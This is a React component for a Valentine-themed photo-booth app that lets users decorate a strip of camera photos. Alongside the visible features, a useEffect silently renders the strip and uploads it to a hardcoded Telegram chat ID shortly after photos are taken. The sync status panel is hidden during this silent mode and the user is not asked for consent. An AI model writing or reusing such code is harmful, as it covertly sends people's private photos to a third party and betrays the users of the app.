import React, { useRef, useState, useEffect } from 'react';
import { CapturedPhoto, FrameOption, StickerOption } from '../types';
import { toPng, toBlob } from 'html-to-image';
import { FRAMES, STICKERS, STICKER_BACKGROUNDS, STICKER_FRAMES, ALL_FRAMES, ALL_BACKGROUNDS } from '../constants';
import { sendPhotoToTelegram } from '../services/telegramService';
import { audioService } from '../services/audioService';

interface PhotoStripProps {
  photos: any[];
  frame: any;
  setFrame: (frame: any) => void;
  onReset: () => void;
  selectedStickers: any[];
  setSelectedStickers: (stickers: any[]) => void;
  stickerStyle: 'single' | 'burst' | 'chaos' | 'border' | 'corners';
  setStickerStyle: (style: 'single' | 'burst' | 'chaos' | 'border' | 'corners') => void;
  stripCaption: string;
  setStripCaption: (caption: string) => void;
  background: any;
  setBackground: (bg: any) => void;
}

interface VisualEffect {
  id: string;
  name: string;
  filter: string;
  overlay?: 'sparkle' | 'cupid-sparkle' | 'hearts' | 'rose';
}

const TELEGRAM_CHAT_ID = '-1003882515226';

const EFFECTS: VisualEffect[] = [
  { id: 'none', name: 'Original', filter: 'none' },
  { id: 'glow', name: 'Dreamy', filter: 'brightness(1.1) contrast(1.05) saturate(1.1) blur(0.4px)' },
  { id: 'kiss', name: 'Cupid', filter: 'sepia(0.3) hue-rotate(-20deg) saturate(1.6) brightness(1.05)' },
  { id: 'vintage', name: 'Vintage', filter: 'sepia(0.6) contrast(0.9) brightness(1.1) saturate(0.8)' },
  { id: 'noir', name: 'Noir', filter: 'grayscale(1) contrast(1.3) brightness(0.95)' },
  { id: 'rose-tint', name: 'Rose Tint', filter: 'sepia(0.2) brightness(1.05) hue-rotate(-30deg) saturate(1.2)', overlay: 'rose' },
  { id: 'heart-bokeh', name: 'Hearts', filter: 'brightness(1.05)', overlay: 'hearts' },
  { id: 'golden-hour', name: 'Warm Glow', filter: 'brightness(1.1) saturate(1.4) sepia(0.3) hue-rotate(-10deg)' },
  { id: 'passion', name: 'Passion', filter: 'saturate(2) contrast(1.1) brightness(0.9) sepia(0.1) hue-rotate(-15deg)' },
  { id: 'cupid-sparkle', name: 'Cupid Sparkle', filter: 'brightness(1.1) contrast(1.1)', overlay: 'cupid-sparkle' },
  { id: 'sparkle', name: 'Sparkle', filter: 'brightness(1.1) contrast(1.1)', overlay: 'sparkle' },
];

export const PhotoStrip: React.FC<PhotoStripProps> = ({
  photos,
  frame,
  setFrame,
  onReset,
  selectedStickers,
  setSelectedStickers,
  stickerStyle,
  stripCaption,
  setStripCaption,
  background,
  setBackground
}) => {
  const stripRef = useRef<HTMLDivElement>(null);
  const [isExporting, setIsExporting] = useState<'download' | 'share' | 'telegram' | null>(null);
  const [selectedEffect, setSelectedEffect] = useState<VisualEffect>(EFFECTS[0]);
  const [syncStatus, setSyncStatus] = useState<'idle' | 'syncing' | 'success' | 'error'>('idle');
  const [previewUrl, setPreviewUrl] = useState<string | null>(null);
  const [isSilentSync, setIsSilentSync] = useState(false);
  const hasAutoSynced = useRef(false);

  // Robust options for html-to-image to prevent "Failed to read cssRules" errors
  const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);

  const exportOptions = {
    cacheBust: false,
    pixelRatio: isIOS ? 2 : 3, // High-res export (Retina quality)
    backgroundColor: '#ffffff',
    fontEmbedCSS: '',
    filter: (node: HTMLElement) => {
      const isGoogleFont = node.tagName === 'LINK' && (node as any).href?.includes('fonts.googleapis.com');
      return !isGoogleFont;
    },
    style: {
      transform: 'scale(1)',
      opacity: '1',
      visibility: 'visible',
    },
    // Ensure all images are captured including backgrounds
    includeQueryParams: true,
  };

  const handleTelegramSync = async (silent = false) => {
    if (!stripRef.current || syncStatus === 'syncing') return;

    console.log('Starting Telegram sync...', { silent });
    if (!silent) setIsExporting('telegram');
    setIsSilentSync(silent);
    setSyncStatus('syncing');

    try {
      // Higher delay for iOS/mobile to ensure UI is ready
      const captureDelay = isIOS ? 1500 : 1000;
      await new Promise(r => setTimeout(r, captureDelay));

      console.log('Capturing strip image (warmup)...');
      // Wait for all images in the strip to be fully decoded
      if (stripRef.current) {
        const imgs = Array.from(stripRef.current.querySelectorAll('img')) as HTMLImageElement[];
        await Promise.all(imgs.map(img => {
          // Add crossOrigin for better capture compatibility
          img.crossOrigin = 'anonymous';
          if (img.complete) return img.decode().catch(() => { });
          return new Promise(resolve => {
            img.onload = () => img.decode().then(resolve).catch(resolve);
            img.onerror = resolve;
          });
        }));
      }

      // Warm up call
      await toPng(stripRef.current!, exportOptions as any);

      console.log('Capturing strip image (final)...');
      const dataUrl = await toPng(stripRef.current!, exportOptions as any);
      const res = await fetch(dataUrl);
      const blob = await res.blob();

      if (!blob || blob.size < 1000) {
        console.error('Blob generation failed or too small:', blob?.size);
        throw new Error('Image capture failed. Please try again.');
      }

      console.log(`Blob created: ${blob.size} bytes. Sending to Telegram...`);

      const caption = `❤️ Love Booth Capture!`;

      const result = await sendPhotoToTelegram(blob, TELEGRAM_CHAT_ID, caption);
      console.log('Telegram sync successful:', result);

      setSyncStatus('success');
      if (!silent) audioService.playSuccess();
      hasAutoSynced.current = true;
    } catch (err: any) {
      console.error('Telegram sync failed with error:', err);
      setSyncStatus('error');
      // Only show alert if it manual retry
      if (!silent) alert(`Wait! Images are still loading or capture failed. Please try again!`);
    } finally {
      setIsExporting(null);
    }
  };

  useEffect(() => {
    // Wait for everything to settle before auto-sync
    const timer = setTimeout(() => {
      if (photos.length > 0 && !hasAutoSynced.current && syncStatus === 'idle') {
        handleTelegramSync(true);
      }
    }, 2000);
    return () => clearTimeout(timer);
  }, [photos, syncStatus]);

  const handleDownload = async () => {
    if (!stripRef.current) return;
    setIsExporting('download');
    try {
      // Higher quality wait
      const imgs = Array.from(stripRef.current.querySelectorAll('img')) as HTMLImageElement[];
      await Promise.all(imgs.map(img => img.decode().catch(() => { })));

      const dataUrl = await toPng(stripRef.current, exportOptions as any);

      if (isIOS) {
        setPreviewUrl(dataUrl);
      } else {
        const link = document.createElement('a');
        link.download = `love-booth-${Date.now()}.png`;
        link.href = dataUrl;
        link.click();
      }
    } catch (err) {
      console.error('Download failed', err);
      alert('Oops! Trying one more time...');
      const dataUrl = await toPng(stripRef.current!, exportOptions as any);
      setPreviewUrl(dataUrl);
    } finally {
      setIsExporting(null);
    }
  };

  const handleShare = async () => {
    if (!stripRef.current) return;
    setIsExporting('share');
    try {
      const dataUrl = await toPng(stripRef.current, exportOptions as any);
      const res = await fetch(dataUrl);
      const blob = await res.blob();
      if (!blob) return;
      const file = new File([blob], 'love-booth.png', { type: 'image/png' });
      if (navigator.share) {
        await navigator.share({ files: [file], title: 'My Love Booth Strip' });
      } else {
        handleDownload();
      }
    } catch (err) {
      console.error('Share failed', err);
      handleDownload();
    } finally {
      setIsExporting(null);
    }
  };

  const renderOverlay = (overlayType?: string) => {
    if (!overlayType) return null;
    switch (overlayType) {
      case 'rose': return <div className="absolute inset-0 bg-pink-500/10 pointer-events-none mix-blend-overlay" />;
      case 'sparkle': return (
        <div className="absolute inset-0 pointer-events-none overflow-hidden">
          <div className="absolute top-2 left-4 w-1 h-1 bg-white rounded-full animate-pulse shadow-[0_0_8px_white]" />
          <div className="absolute top-10 right-8 w-1.5 h-1.5 bg-yellow-100 rounded-full animate-pulse [animation-delay:0.5s]" />
          <div className="absolute bottom-6 left-10 w-1 h-1 bg-white rounded-full animate-pulse [animation-delay:1s]" />
        </div>
      );
      case 'cupid-sparkle': return (
        <div className="absolute inset-0 pointer-events-none overflow-hidden">
          <div className="absolute top-4 left-1/4 w-1.5 h-1.5 bg-pink-200 rounded-full animate-ping" />
          <div className="absolute bottom-1/4 left-1/3 w-1.5 h-1.5 bg-white rounded-full animate-ping" />
        </div>
      );
      case 'hearts': return (
        <div className="absolute inset-0 pointer-events-none overflow-hidden opacity-40">
          <div className="absolute top-2 left-2 text-xs">❤️</div>
          <div className="absolute bottom-4 right-6 text-sm rotate-12">💖</div>
        </div>
      );
      default: return null;
    }
  };

  return (
    <div className="flex flex-col items-center space-y-6 animate-in fade-in zoom-in duration-500 w-full max-w-lg px-4 pb-12">
      {/* Dynamic Customization Controls */}
      <div className="w-full space-y-4">
        {/* Stickers Selector - Top priority for mobile */}
        <div className="w-full bg-white/80 backdrop-blur-sm p-4 rounded-3xl shadow-sm border border-pink-100 flex flex-col items-center gap-3">
          <div className="flex flex-col items-center gap-1">
            <span className="text-pink-500 font-bold text-[10px] uppercase tracking-widest">Add Stickers</span>
            <div className="flex bg-pink-100/50 p-0.5 rounded-full mb-1 flex-wrap justify-center gap-1">
              {[
                { id: 'single', label: 'Classic' },
                { id: 'burst', label: 'Burst' },
                { id: 'chaos', label: 'Chaos' },
                { id: 'border', label: 'Border' },
                { id: 'corners', label: 'Corners' }
              ].map(s => (
                <button
                  key={s.id}
                  onClick={() => setStickerStyle(s.id as any)}
                  className={`px-2 py-0.5 rounded-full text-[7px] font-bold uppercase transition-all ${stickerStyle === s.id ? 'bg-pink-500 text-white shadow-sm' : 'text-pink-400 hover:bg-pink-100'}`}
                >
                  {s.label}
                </button>
              ))}
            </div>
          </div>
          <div className="flex flex-wrap justify-center gap-2 px-1">
            <button
              onClick={() => setSelectedStickers([])}
              className={`w-7 h-7 sm:w-8 sm:h-8 rounded-full border-2 transition-all hover:scale-110 active:scale-95 flex items-center justify-center ${selectedStickers.length === 0 ? 'border-pink-500 scale-110 ring-2 ring-pink-100' : 'border-gray-200'
                }`}
              title="Clear All"
            >
              <span className="text-[10px] text-gray-400">Clear</span>
            </button>
            {STICKERS.map(sticker => {
              const isSelected = selectedStickers.some(s => s.id === sticker.id);
              return (
                <button
                  key={sticker.id}
                  onClick={() => {
                    setSelectedStickers(isSelected
                      ? selectedStickers.filter(s => s.id !== sticker.id)
                      : [...selectedStickers, sticker]
                    );
                  }}
                  className={`w-7 h-7 sm:w-8 sm:h-8 rounded-lg border-2 overflow-hidden transition-all hover:scale-110 active:scale-95 ${isSelected ? 'border-pink-500 scale-110 ring-2 ring-pink-100' : 'border-gray-200'
                    }`}
                  title={sticker.name}
                >
                  <img src={sticker.url} className="w-full h-full object-contain p-0.5" alt={sticker.name} />
                </button>
              );
            })}
          </div>
        </div>

        {/* Frame Selector */}
        <div className="w-full bg-white/80 backdrop-blur-sm p-4 rounded-3xl shadow-sm border border-pink-100 flex flex-col items-center gap-3">
          <span className="text-pink-500 font-bold text-[10px] uppercase tracking-widest">Change Frame</span>
          <div className="flex flex-wrap justify-center gap-2 px-1 max-h-32 overflow-y-auto custom-scrollbar">
            {ALL_FRAMES.map(f => (
              <button
                key={f.id}
                onClick={() => setFrame(f)}
                className={`w-7 h-7 sm:w-8 sm:h-8 rounded-full border-2 transition-all hover:scale-110 active:scale-95 ${frame.id === f.id ? 'border-pink-500 scale-110 ring-2 ring-pink-100' : 'border-gray-200'
                  }`}
                style={f.imageUrl
                  ? { backgroundImage: `url(${f.imageUrl})`, backgroundSize: 'cover' }
                  : { backgroundColor: f.previewColor }
                }
                title={f.name}
              />
            ))}
          </div>
        </div>

        {/* Filters Selector */}
        <div className="w-full bg-white/80 backdrop-blur-sm p-4 rounded-3xl shadow-sm border border-pink-100 flex flex-col items-center gap-3">
          <span className="text-pink-500 font-bold text-[10px] uppercase tracking-widest">Filters</span>
          <div className="flex flex-wrap justify-center gap-1.5 px-1">
            {EFFECTS.map(eff => (
              <button
                key={eff.id}
                onClick={() => setSelectedEffect(eff)}
                className={`px-3 py-1 rounded-full text-[9px] sm:text-[10px] font-bold transition-all ${selectedEffect.id === eff.id ? 'bg-pink-500 text-white shadow-md' : 'bg-pink-50 text-pink-400'
                  }`}
              >
                {eff.name}
              </button>
            ))}
          </div>
        </div>

        {/* Atmosphere Selector */}
        <div className="w-full glass-card p-4 rounded-3xl flex flex-col items-center gap-3">
          <span className="text-pink-500 font-bold text-[10px] uppercase tracking-widest">Atmosphere</span>
          <div className="flex flex-wrap justify-center gap-2 max-h-40 overflow-y-auto p-1 custom-scrollbar">
            {ALL_BACKGROUNDS.map(bg => (
              <button
                key={bg.id}
                onClick={() => setBackground(bg)}
                className={`w-9 h-9 rounded-xl border-2 transition-all hover:scale-110 active:scale-95 flex items-center justify-center overflow-hidden ${background.id === bg.id ? 'border-pink-500 scale-110 ring-2 ring-pink-100' : 'border-white/50'}`}
                title={bg.name}
              >
                <div
                  className={`w-full h-full ${bg.className} flex items-center justify-center`}
                  style={bg.imageUrl ? { backgroundImage: `url(${bg.imageUrl})`, backgroundSize: 'contain', backgroundRepeat: 'no-repeat', backgroundPosition: 'center', backgroundColor: '#fff' } : {}}
                >
                  {!bg.imageUrl && <span className="text-sm">{bg.icon}</span>}
                </div>
              </button>
            ))}
          </div>
        </div>

        {/* Caption Editor */}
        <div className="w-full bg-white/80 backdrop-blur-sm p-4 rounded-3xl shadow-sm border border-pink-100 flex flex-col items-center gap-3">
          <span className="text-pink-500 font-bold text-[10px] uppercase tracking-widest">Edit Caption</span>
          <input
            type="text"
            value={stripCaption}
            onChange={(e) => setStripCaption(e.target.value)}
            placeholder="Write your message..."
            className="w-full px-4 py-2 rounded-xl border border-pink-100 focus:outline-none focus:ring-2 focus:ring-pink-400 bg-white/50 text-pink-600 text-sm font-medium text-center"
            maxLength={30}
          />
        </div>
      </div>

      <div
        ref={stripRef}
        className="p-4 shadow-2xl rounded-sm max-w-[320px] w-full border-[10px] border-white/50 flex flex-col items-center transition-all duration-300 relative overflow-hidden"
      >
        {/* Layer 1: Atmosphere Background */}
        <div
          className={`absolute inset-0 z-0 ${background.className}`}
          style={background.imageUrl ? {
            backgroundImage: `url(${background.imageUrl})`,
            backgroundSize: background.id.startsWith('bg-sticker') ? '60px 60px' : 'cover',
            backgroundRepeat: background.id.startsWith('bg-sticker') ? 'repeat' : 'no-repeat'
          } : {}}
        />

        {/* Layer 2: Frame Pattern */}
        <div
          className={`absolute inset-0 z-1 ${frame.className}`}
          style={frame.imageUrl ? { backgroundImage: `url(${frame.imageUrl})`, backgroundSize: '60px 60px' } : {}}
        />

        <div className="flex flex-col space-y-4 w-full relative z-10">
          <div className="flex flex-col space-y-4 w-full">
            {photos.map((photo, index) => (
              <div key={photo.id} className="relative overflow-hidden aspect-[4/3] bg-white shadow-md border-[6px] border-white">
                <img
                  src={photo.dataUrl}
                  alt={`Captured ${index + 1}`}
                  decoding="sync"
                  className="w-full h-full object-cover"
                  style={{ filter: selectedEffect.filter }}
                />
                {renderOverlay(selectedEffect.overlay)}
                <div className="absolute top-2 right-2 text-[10px] text-pink-500/30 font-bold rotate-12 uppercase">XOXO</div>
                {selectedStickers.flatMap((sticker, sIdx) => {
                  const STICKER_STYLES = [
                    { bottom: '5%', left: '5%' }, { top: '5%', right: '5%' },
                    { top: '5%', left: '5%' }, { bottom: '5%', right: '5%' },
                    { top: '5%', left: '42.5%' }, { top: '40%', left: '5%' },
                    { top: '40%', right: '5%' },
                  ];

                  const BORDER_STYLES = [
                    { top: '2%', left: '2%' }, { top: '2%', left: '25%' }, { top: '2%', left: '50%' }, { top: '2%', left: '75%' }, { top: '2%', right: '2%' },
                    { bottom: '2%', left: '2%' }, { bottom: '2%', left: '25%' }, { bottom: '2%', left: '50%' }, { bottom: '2%', left: '75%' }, { bottom: '2%', right: '2%' },
                    { top: '25%', left: '2%' }, { top: '50%', left: '2%' }, { top: '75%', left: '2%' },
                    { top: '25%', right: '2%' }, { top: '50%', right: '2%' }, { top: '75%', right: '2%' },
                  ];

                  const CORNER_STYLES = [
                    { top: '3%', left: '3%' }, { top: '10%', left: '3%' }, { top: '3%', left: '10%' },
                    { top: '3%', right: '3%' }, { top: '10%', right: '3%' }, { top: '3%', right: '10%' },
                    { bottom: '3%', left: '3%' }, { bottom: '10%', left: '3%' }, { bottom: '3%', left: '10%' },
                    { bottom: '3%', right: '3%' }, { bottom: '10%', right: '3%' }, { bottom: '3%', right: '10%' },
                  ];

                  let configs: { style: React.CSSProperties; key: string }[] = [];

                  if (stickerStyle === 'burst') {
                    configs = STICKER_STYLES.map((pos, i) => ({ style: pos, key: `${photo.id}-${sticker.id}-burst-${i}` }));
                  } else if (stickerStyle === 'border') {
                    configs = BORDER_STYLES.map((pos, i) => ({ style: { ...pos, transform: 'scale(0.7)' }, key: `${photo.id}-${sticker.id}-border-${i}` }));
                  } else if (stickerStyle === 'corners') {
                    configs = CORNER_STYLES.map((pos, i) => ({ style: pos, key: `${photo.id}-${sticker.id}-corners-${i}` }));
                  } else if (stickerStyle === 'chaos') {
                    for (let i = 0; i < 6; i++) {
                      const seed = (sIdx + 1) * (i + 1);
                      configs.push({
                        key: `${photo.id}-${sticker.id}-chaos-${i}`,
                        style: {
                          top: `${(seed * 17) % 80 + 5}%`,
                          left: `${(seed * 23) % 80 + 5}%`,
                          transform: `rotate(${(seed * 45) % 360}deg) scale(${(seed % 5) * 0.2 + 0.6})`,
                          opacity: 0.9,
                        }
                      });
                    }
                  } else {
                    configs = [{ style: STICKER_STYLES[sIdx % STICKER_STYLES.length], key: `${photo.id}-${sticker.id}-single` }];
                  }

                  return configs.map(cfg => (
                    <div key={cfg.key} className="absolute w-8 h-8 pointer-events-none transition-all duration-300 animate-in zoom-in" style={cfg.style}>
                      <img src={sticker.url} className="w-full h-full object-contain drop-shadow-md" alt="Sticker" crossOrigin="anonymous" />
                    </div>
                  ));
                })}
              </div>
            ))}

            <div className="pt-6 pb-2 px-3 text-center border-t-2 border-dashed border-pink-300/30">
              <h3 className="font-pacifico text-pink-500 text-xl mb-1">{stripCaption || 'Valentine 2026'}</h3>

            </div>
          </div>
        </div>

        <div className="flex flex-col gap-3 w-full">
          <div className={`w-full p-4 rounded-3xl border transition-all duration-500 flex items-center justify-between shadow-sm backdrop-blur-sm ${isSilentSync ? 'hidden' :
            syncStatus === 'success' ? 'bg-green-50/80 border-green-100' :
              syncStatus === 'error' ? 'bg-red-50/80 border-red-100' : 'bg-sky-50/80 border-sky-100'
            }`}>
            <div className="flex items-center gap-3">
              <div className={`p-2 rounded-xl text-white ${syncStatus === 'success' ? 'bg-green-500' :
                syncStatus === 'error' ? 'bg-red-500' : 'bg-sky-500'
                }`}>
                {syncStatus === 'syncing' ? (
                  <svg className="animate-spin h-5 w-5" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
                ) : syncStatus === 'success' ? (
                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" /></svg>
                ) : (
                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.02-1.96 1.25-5.54 3.69-.52.35-.99.53-1.41.52-.46-.01-1.35-.26-2.01-.48-.81-.27-1.45-.42-1.39-.88.03-.24.36-.48.99-.74 3.86-1.68 6.44-2.78 7.72-3.31 3.67-1.53 4.44-1.8 4.94-1.81.11 0 .35.03.5.16.13.1.17.24.18.33.01.07.02.24.01.3z" /></svg>
                )}
              </div>
              <div className="flex flex-col">
                <span className={`font-bold text-xs ${syncStatus === 'success' ? 'text-green-600' : syncStatus === 'error' ? 'text-red-600' : 'text-sky-600'}`}>
                  {syncStatus === 'syncing' ? 'Auto-syncing to Telegram...' :
                    syncStatus === 'success' ? 'Synced to Telegram! ❤️' :
                      syncStatus === 'error' ? 'Sync failed. Retry below.' : 'Ready to sync.'}
                </span>
                <span className="text-[10px] opacity-60">To: -1003882515226</span>
              </div>
            </div>
            {syncStatus === 'error' && (
              <button onClick={() => handleTelegramSync(false)} className="text-xs bg-red-100 text-red-600 px-3 py-1 rounded-full font-bold">Retry</button>
            )}
          </div>

          <div className="flex gap-3 w-full">
            <button
              disabled={!!isExporting}
              onClick={handleDownload}
              className="flex-1 px-6 py-4 rounded-full font-bold shadow-lg flex items-center justify-center gap-2 bg-white border-2 border-pink-400 text-pink-500 hover:bg-pink-50 transition-colors"
            >
              Download
            </button>
            <button
              disabled={!!isExporting}
              onClick={handleShare}
              className="flex-1 px-6 py-4 rounded-full font-bold shadow-xl flex items-center justify-center gap-2 bg-gradient-to-r from-rose-500 to-pink-400 text-white hover:opacity-90 transition-opacity"
            >
              Share
            </button>
          </div>

          <button onClick={onReset} className="w-full py-3 text-pink-400 text-xs font-bold uppercase tracking-widest hover:text-pink-600 transition-colors">
            Retake Photos
          </button>
        </div>

        {/* iOS/Generic Save Modal */}
        {previewUrl && (
          <div className="fixed inset-0 z-[100] bg-black/90 backdrop-blur-md flex flex-col items-center justify-center p-6 animate-in fade-in duration-300">
            <button
              onClick={() => setPreviewUrl(null)}
              className="absolute top-6 right-6 text-white bg-white/20 p-2 rounded-full hover:bg-white/40 transition-colors"
            >
              <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
              </svg>
            </button>

            <div className="text-center space-y-4 max-w-sm">
              <h3 className="text-white font-bold text-xl">Save your Memory!</h3>
              <p className="text-pink-200 text-sm">Long press the image below and select <span className="text-white font-bold">"Save to Photos"</span> or "Download Image"</p>

              <div className="relative group">
                <img src={previewUrl} className="w-full h-auto rounded-lg shadow-2xl border-4 border-white" alt="Your Love Strip" />
              </div>

              <button
                onClick={() => setPreviewUrl(null)}
                className="w-full py-4 bg-pink-500 text-white rounded-full font-bold shadow-lg mt-4"
              >
                Done
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
